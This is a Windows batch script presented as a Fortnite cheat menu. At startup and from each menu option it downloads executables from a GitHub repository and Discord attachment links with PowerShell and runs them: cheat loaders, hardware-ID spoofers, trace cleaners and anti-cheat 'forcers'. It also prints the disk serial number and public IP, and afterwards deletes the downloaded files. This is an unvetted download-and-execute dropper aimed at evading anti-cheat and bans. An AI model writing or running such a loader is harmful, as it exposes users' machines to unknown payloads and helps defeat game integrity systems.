@echo off
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/welcome.vbs -OutFile %temp%/welcome.vbs

IF EXIST "%temp%/loader.exe" (
    goto :menu
    
goto :menu
) ELSE (
    goto :start
)

:start
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/welcome.vbs -OutFile %temp%/welcome.vbs
"%temp%/welcome.vbs"
"%temp%/loader.exe"
IF EXIST "%temp%/." (
    del  %temp%\*.exe  /Q
    del  %temp%\*.vbs  /Q
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe

:exitstart
IF EXIST "%temp%/." (
    del  %temp%\*.exe  /Q
exit
) ELSE (
    exit
)
:menu
cls
echo 1 - Cleaner
echo 2 - Cheats
echo 3 - Spoofer
echo 4 - run fortnite
echo 5 - spoofer test
echo 6 - exit

SET /P M=type 1-6 then press enter : 

if "%M%"=="1" goto :Cleaner
if "%M%"=="2" goto :Cheats
if "%M%"=="3" goto :spoofer
if "%M%"=="4" goto :fortnite
if "%M%"=="5" goto :hwid
if "%M%"=="6" goto :exit

:Cleaner
cls
echo 1 - start cleaner
echo .
echo 99 - go back
SET /P x=type 1-2 then press enter :
if "%x%"=="99" goto :menu
if "%x%"=="1" goto :cleanerstart

:hwid
 wmic path win32_diskdrive get SerialNumber
 
 echo ip:
 powershell (Invoke-WebRequest ifconfig.me/ip).Content.Trim()
 pause
 goto :menu

:cleanerstart 
cls
echo starting 1buttoncleaner
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/1buttonCLEANERv6dot2.exe -OutFile %temp%/1button.exe
start "start" "%temp%\1button.exe"
timeout /t 60
taskkill /f /im 1button.exe
echo starting 1buttoncleaner again.
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/1buttonCLEANERv6dot2.exe?raw=true -OutFile %temp%/1button.exe
start "start" "%temp%\1button.exe"
timeout /t 60
echo starting Advanced cleaner
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/AdvancedEventCleaner.exe -OutFile %temp%/advancedcleaner.exe
start "start" "%temp%\advancedcleaner.exe"
timeout /t 60
echo Starting Applecleaner
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/appleS4.exe -OutFile %temp%/apples4.exe
start "start" "%temp%\apples4.exe"
Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/FIXusrTEMPv6.exe -OutFile %temp%\fixtemp.exe
start "start" "%temp%\fixtemp.exe"
cls
goto :start

:Cheats
cls
echo choose your cheat
echo 1 - Snipermania
echo 2 - memenite
echo 3 - speedfn
echo.
echo 99 - back

set /p n=type 1 to 3 then press enter : 
if "%n%"=="1" goto :snipermania
if "%n%"=="2" goto :memenite
if "%n%"=="3" goto :speedfn
if "%n%"=="99" goto :menu
cls

:snipermania
echo 1 - run snipermania with driver
echo 2 - run snipermania without driver
echo 99 - back
set /p z=type 1,2 or 99 then press enter : 
if "%z%"=="1" goto :yesdriver
if "%z%"=="2" goto :nodriver
if "%z%"=="99" goto :menu

:yesdriver
cls
echo Goto your game libary and press enter
"C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe"
pause
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/774913680029515796/PreferredDriver.exe -OutFile %temp%\preferd.exe
start "start" "%temp%\preferd.exe"
echo press enter when in lobby
pause
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/777161092861526036/MANIAnovG.exe -OutFile %temp%\mania.exe
start "start" "%temp%\mania.exe"
goto :exitstart

:fortnite
cls
goto :work

:work
echo 1 - eacforcer by 4u4
echo 2 - eac by stefanodvx
echo 99 - back
set /p a=type 1,2 or 99 then press enter : 
if "%a%"=="1" goto :eacforcerby4u4
if "%a%"=="2" goto :eacbystefanodvx
if "%a%"=="99" goto :menu


:eacforcerby4u4
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/775017010316050432/fixBEandEACv6.exe -OutFile %temp%\fixbeandeac.exe
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/776102946420031548/EACforcR5-26.exe -OutFile %temp%\eacforcerby4u4.exe
"%temp%\fixbeandeac.exe"
"%temp%\eacforcerby4u4.exe"
pause
start "start" "steam://rungameid/18013199986006687744"
goto :menu

:eacbystefanodvx
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/775017010316050432/fixBEandEACv6.exe -OutFile %temp%\fixbeandeac.exe
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/776095653738315786/EAC_Forcer_1.exe -OutFile %temp%\eacforcer.exe
"%temp%\fixbeandeac.exe"
"%temp%\eacforcer.exe"
pause
start "start" "steam://rungameid/18013199986006687744"
goto :menu

:memenite
cls
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/774914166984409158/memenite.club.exe -OutFile %temp%\memenite.exe
start "start" "%temp%\memenite.exe"

goto :exitstart

:spoofer
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/774920835739680788/nullspooferNOV20.exe -OutFile %temp%\nullspoofer.exe
start "start" "%temp%\nullspoofer.exe"

goto :menu

:speedfn
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/774913722048970773/SpeedFN_Loader_1.exe -OutFile %temp%\speedfn.exe
start "start" "%temp%\speedfn.exe"
goto :exitstart

:nodriver
echo press enter when in lobby
pause
powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/774913548827885592/777161092861526036/MANIAnovG.exe -OutFile %temp%\mania.exe
start "start" "%temp%\mania.exe"
goto :exitstart

:exit
exit
